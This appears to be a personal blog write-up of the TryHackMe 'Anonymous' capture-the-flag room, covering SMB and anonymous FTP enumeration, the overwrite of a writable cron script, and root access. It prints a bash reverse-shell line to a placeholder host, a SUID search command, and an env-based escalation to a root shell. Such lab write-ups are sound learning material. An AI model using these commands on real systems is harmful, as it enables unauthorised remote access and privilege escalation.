---
created: 2026-02-25
tags:
  - note
  - journal
  - cyberStuff
title: anonymous
draft: false
date:
subiect:
dificultate: 3
amuca: false
link:
  - https://tryhackme.com/room/anonymous
lastmod: 2026-02-25T19:44:45.735Z
---
To answer the first two questions just basic nmap scan\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225133840.png)

then lets enumerate the SMB service\
note: smb ( server message block) is a communication protocol used to share files , printers , serial ports and miscellaneous commmunication\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225134257.png)\
ok interesting lets verify that smb files\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225134958.png)\
i dowloaded those two files and check them but nothing to interesting\
lets check ftp now

![](/images/blog-ul-meu/static/Pasted%20image%2020260225135546.png)\
i entered the ftp server and enumerate it ( i logged in with anonymous credentials , that means nothing , ok cool ) , then i found a scripts folder and get it contents

looking inside those files only the clean.sh seems interesting\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225140022.png)\
yeah nothing really cool , but lets rewind a lil bit\
looking back at the permisions of the files we downloaded we see that\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225140336.png)\
clean.sh has some crazy permmissions on , so lets try to create our one clean.sh and overwrite this

ok so what i did i replace clean.sh content with :

```
#!/bin/bash 
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
```

then i put the file on the system\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225140827.png)\
and in just a few seconds i got a reverse shell\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225140932.png)\
boom , and we got user.txt and pics folder other two answers

i enumerated some suid with

```
find / -perm -u=s -type f 2>/dev/null
```

and luckely i founded good old env\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225144302.png)\
cool lets use that\
![](/images/blog-ul-meu/static/Pasted%20image%2020260225144413.png)\
and bam with

```
env /bin/sh -p
```

we are root now , ez , very cool room
